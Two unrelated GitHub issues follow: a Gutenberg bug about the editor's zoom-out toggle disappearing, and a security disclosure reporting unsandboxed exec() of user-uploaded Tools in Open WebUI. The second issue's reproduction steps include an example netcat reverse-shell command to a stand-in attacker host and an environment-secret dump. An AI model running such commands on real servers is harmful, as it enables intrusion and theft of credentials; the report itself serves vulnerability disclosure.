labels.name: [Type] Bug
labels.description: An existing feature does not function as intended

issue.body:
From further discovery [this is the true cause of the Issue](https://github.com/WordPress/gutenberg/issues/66884#issuecomment-2466091010)

> If a block with apiVersion below 2 is registered, the editor is not an iframe.
> If the editor is not an iframe, the zoom out toggle button will not be displayed.
> However, when you click the Patterns tab, the editor works as an iframe, so the zoom out toggle button appears.

---------

When too many plugins are registering items in the toolbar, the zoom toggle disappears in 6.7-RC4:

https://github.com/user-attachments/assets/c54a27fc-ea1a-43f5-9813-4f5390289309

Steps to replicate:
1. Install and activate Jetpack and Yoast.
2. Open up Pages > Add new.
3. Notice you don't see the zoom out toggle.
4. Notice that if you open up the Inserter > Patterns, that it appears.

I'd expect that the zoom out toggle would still be visible and, no matter how wide I try to make the viewport, it never shows up. cc @getdave I couldn't find a comparable issue on the 6.7 board for zoom out. 

Props to @laurelfulford for first finding this!

issue.title: [OWU] #1: Remote Code Execution via unsandboxed Tools/Functions
issue.body:
### Check Existing Issues

- [x] I have searched the existing issues and discussions.
- [x] I am using the latest version of Open WebUI.

### Installation Method

Git Clone

### Open WebUI Version

v0.3.11

### Ollama Version (if applicable)

_No response_

### Operating System

macOS Sequoia 15.5

### Browser (if applicable)

_No response_

### Confirmation

- [x] I have read and followed all instructions in `README.md`.
- [x] I am using the latest version of **both** Open WebUI and Ollama.
- [x] I have included the browser console logs.
- [x] I have included the Docker container logs.
- [x] I have **provided every relevant configuration, setting, and environment variable used in my setup.**
- [x] I have clearly **listed every relevant configuration, custom setting, environment variable, and command-line option that influences my setup** (such as Docker Compose overrides, .env values, browser settings, authentication configurations, etc).
- [x] I have documented **step-by-step reproduction instructions that are precise, sequential, and leave nothing to interpretation**. My steps:
- Start with the initial platform/version/OS and dependencies used,
- Specify exact install/launch/configure commands,
- List URLs visited, user input (incl. example values/emails/passwords if needed),
- Describe all options and toggles enabled or changed,
- Include any files or environmental changes,
- Identify the expected and actual result at each stage,
- Ensure any reasonably skilled user can follow and hit the same issue.


### Expected Behavior

When an admin (or any user) uploads a Tool or Function, its code should be executed in a tightly-controlled sandbox (separate process, jailed container, or restricted interpreter). At minimum it should not have unrestricted filesystem or network access, and certainly must not execute with the full privileges of the Open WebUI backend process.

### Actual Behavior

```backend/open_webui/utils/plugin.py``` loads the submitted code into memory and calls Python‚Äôs built-in exec() directly:

```
100  exec(content, module.__dict__)
...
144  exec(content, module.__dict__)
```

Because this runs inside the main FastAPI worker:
- The uploaded script executes instantly with full server privileges (same user/group as the backend).
- It can read/write arbitrary files, steal environment secrets (e.g., OPENAI_API_KEYS), pivot to other hosts, or render the service un-trustworthy.
- Compounded by install_frontmatter_requirements() (same file) which performs a runtime pip install, an attacker can permanently implant malicious packages.

This is a Critical-severity Remote Code Execution vulnerability.


### Steps to Reproduce

>  These steps assume a default Docker deployment ```(docker-compose up -d)``` on a clean Ubuntu 22.04 host.
1. Log in to Open WebUI as an admin.
2. Go to Tools ‚Üí Create Tool.
3. Paste the following minimal payload
4. Save the tool and invoke it from any chat via the ```/tool evil``` command (or simply refresh if auto-hooked).
5. Observe on the host: ls ```/tmp/OWNED``` ‚Üí the file exists, confirming arbitrary code ran.
6. Check container logs: no warnings or sandboxing‚Äîexecution is silent.
7. Optional: modify the payload to ```import os; print(os.environ)``` to dump secrets or ```subprocess.Popen(["nc", "attacker.com", "4444","-e","/bin/sh"])``` for a reverse shell.

*Expected:* creation of tool should be rejected or executed in isolation.
*Actual:* unrestricted code runs inside the main backend process.

### Logs & Screenshots

Backend log excerpt (nothing suspicious is flagged):

```
INFO utils.plugin: Loaded module: tool_abc123
INFO root: POST /api/chat ...
```

Proof-of-execution on host:
```
$ docker exec -it open-webui ls -l /tmp/OWNED
-rw-r--r-- 1 root root 0 Aug 2 12:34 /tmp/OWNED
```

Browser console shows normal GraphQL traffic; no error surfaced to UI.

### Additional Information

- The vulnerability affects both ‚ÄúTools‚Äù and ‚ÄúFunctions‚Äù code paths ```(load_tool_module_by_id, load_function_module_by_id)```.
- Runtime ```pip install``` compounds the risk‚Äîmalicious dependencies persist across restarts.
- Mitigation ideas:
1. Run user-generated code in a dedicated, non-privileged subprocess or container with seccomp/AppArmor profile.
2. Gate code execution behind an explicit, audited approval step.
3. Remove runtime ```pip install```; instead require dependencies to be pre-declared and installed during build.

treat this as a security-critical issue.
